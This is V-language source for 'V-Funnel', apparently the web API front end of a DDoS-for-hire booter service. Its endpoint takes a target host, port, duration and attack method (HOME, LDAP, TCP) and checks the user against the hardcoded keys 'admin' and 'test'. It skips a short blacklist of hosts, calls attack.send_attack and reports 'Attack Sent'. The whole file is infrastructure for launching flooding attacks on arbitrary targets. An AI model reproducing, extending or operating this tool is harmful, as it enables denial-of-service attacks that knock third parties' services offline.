import vweb
import json
import attack
import os

struct App {
	vweb.Context
}

const (
	key = ["admin", "test"]
	blacklisted = ["1.1.1.1", "8.8.8.8", "127.0.0.1", "fbi.gov", "google.com"]
	methods = ["HOME", "LDAP", "TCP"]
)

fn (mut app App) index() vweb.Result {
	return $vweb.html()
}

fn (mut app App) api() vweb.Result {

	user := app.query["user"]
	host := app.query["host"]
	port := app.query["port"]
    time := app.query["time"]
	method := app.query["method"]

	if user in key {} 
	else {return app.text(json.encode({"error": "Invalid User"}))}
	if user == "" { return app.text(json.encode({"error": "No User"})) }
	else if host == "" { return app.text(json.encode({"error": "No Host"})) }
	else if port == "" { return app.text(json.encode({"error": "No port"})) }
	else if time == "" { return app.text(json.encode({"error": "No time"})) }
	else if method == "" { return app.text(json.encode({"error": "No method"})) }
	if host in blacklisted{return app.text(json.encode({"error": "$host is blacklisted"}))}
	if method in methods {}
	else {return app.text(json.encode({"error": "Invalid method"}))}
	json_data := {
		'host': '$host',
		'port': '$port',
		'time': '$time',
		'method': '$method'
	}
	//app.text("[V-Funnel] Version 1.0\nAttack sent\nHOST: ${host}\nPORT: ${port}\nTIME: ${time}\nMETHOD: ${method}") // use this if you dont like the response to be json
	app.text(json.encode({"Attack Sent": "target: $host:$port for $time seconds with $method"}))
	attack.send_attack(user, host, port, time, method)
	output := json.encode(json_data)
	return app.text(output)
}

fn main() {
	mut port := os.args[1] or {
		panic("Failed to run [V-Funnel], Error with port?")
	}
	vweb.run(&App{}, port.int())
}